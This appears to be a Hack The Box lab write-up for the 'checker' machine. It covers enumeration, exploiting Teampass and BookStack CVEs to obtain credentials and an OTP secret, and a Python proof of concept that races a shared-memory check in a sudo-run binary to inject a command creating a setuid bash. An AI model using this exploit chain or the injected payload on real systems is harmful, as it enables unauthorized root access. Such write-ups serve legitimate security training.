---
layout: post
title: HTB - checker
date: 2025-05-27 17:17 -0400
---

{{ 'checker' | machine_img }}

## nmap
```bash
[sudo] password for shafou:
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-24 10:36 -04
Nmap scan report for checker.htb (10.10.11.56)
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 aa54074198b811b07845f1ca8c5a942e (ECDSA)
|_  256 8f2bf3221e743bee8b40176c6cb1939c (ED25519)
80/tcp   open  http    Apache httpd
|_http-title: 403 Forbidden
|_http-server-header: Apache
8080/tcp open  http    Apache httpd
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: 403 Forbidden
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.86 seconds
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-24 10:37 -04
Warning: 10.10.11.56 giving up on port because retransmission cap hit (10).
Nmap scan report for checker.htb (10.10.11.56)
Host is up (0.16s latency).
All 65535 scanned ports on checker.htb (10.10.11.56) are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 73.81 seconds
```

## subdomain bruteforce
Some rate limiting happening, 100 requests then have to sleep for 5 seconds.

## vault.checker.htb - 8080
Teampass is used to manage password, it has a lot of cves.
![checker.htb](/assets/img/checker9.png)

The first one worked thankfully and we crack bob hash:
- bob:cheerleader


There are two accounts there, one for bookstack and other for ssh.

bookstack:
- bob@checker.htb:mYSeCr3T_w1kI_P4sSw0rD

ssh:
- reader:hiccup-publicly-genesis

ssh needs a otp code for it to work.

## checker.htb - 80
The main site is using bookstack, which is kinda like a wiki. Written in php. Uses version: v23.10.2, according to a css file. Seems to be vulnerable to a SSRF (CVE-2023-6199). The regular poc doesn't work, but it does work with [filter_chains](https://github.com/synacktiv/php_filter_chains_oracle_exploit). Very slow retrieval.

![checker.htb](/assets/img/checker8.png)

One of the books has a hint about `/backup/home_backup/`. We can read .google_authenticator from there `/backup/home_backup/home/reader/.google_authenticator` then we use the secret to generate a otp token.
- [otp generator](https://it-tools.tech/otp-generator)

/backup/home_backup/home/reader/.google_authenticator
- DVDBRAODLCWF7I2ONA4K5LQLUE

![otp code](/assets/img/checker3.png)

```bash
reader@checker:~$ cat user.txt
5221d49d5b46097616fdf5c0a324406f
```

# root
```bash
reader@checker:~$ sudo -l
Matching Defaults entries for reader on checker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *

#!/bin/bash
source `dirname $0`/.env
USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
/opt/hash-checker/check_leak "$USER_NAME"
```

check_leak is a custom binary. Checking it in ghidra it tries to compare the hashes on a db to the leaked hashes on a file. The most interesting part is that it is calling `popen` with mysql.

![popen call](/assets/img/checker6.png)

If we can get control of that string its an easy rce. The string is passed to the binary through shared memory. The thing about shared memory is that anyone can write to it. So the vulnerability is a race condition, the idea is to open a shmem with the flags that we want, let the script write to it and then update the shmem with our payload after some checks have passed. That is a pretty big gap for it actually.

poc:
```python
from ctypes import CDLL, c_char, c_int, c_void_p, memmove, create_string_buffer, addressof
import time
import datetime
import threading
import subprocess

dt = datetime.datetime.now()
local_dt = dt.replace(tzinfo=datetime.timezone.utc).astimezone()
timestamp = int(local_dt.timestamp())

libc = CDLL("libc.so.6")
libc.srand(timestamp)

key = libc.rand() % 0xfffff
print(hex(key))

SIZE = 0x400
IPC_CREAT = 0o1000
IPC_EXCL = 0o2000
PERM = 0o777

shmid = libc.shmget(key, SIZE, IPC_CREAT | IPC_EXCL | PERM)
print(f"{hex(shmid)}")

libc.shmat.restype = c_void_p
addr = libc.shmat(shmid, None, 0)
if addr == 0xffffffffffffffff:
    raise Exception("shmat failed")

target_addr = c_void_p(addr)
str_ptr = create_string_buffer(400)
data = b'Leaked hash detected at Thu Apr 10 01:19:45 2025 > "\'; cp /bin/bash /tmp/123; chmod +xs /tmp/123; echo \'//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
memmove(addressof(str_ptr), data, len(data))

def do_memmove(target, source):
    memmove(target, source, len(source))

def run_script():
    subprocess.run("sudo /opt/hash-checker/check-leak.sh 'bob'", shell=True)

move = threading.Thread(target=do_memmove, args=(target_addr, str_ptr))
script = threading.Thread(target=run_script)

script.start()
time.sleep(0.5)
move.start()

script.join()
move.join()

buffer = (c_char * 400).from_address(addr)
data = bytes(buffer)

print("[+] Dumped shared memory contents:")
print(data)

libc.shmdt(c_void_p(addr))
```

```bash
# /tmp/123 -p
123-5.1# cat /root/root.txt
8b0175f18c7ae4263809a66c5c154aea
```
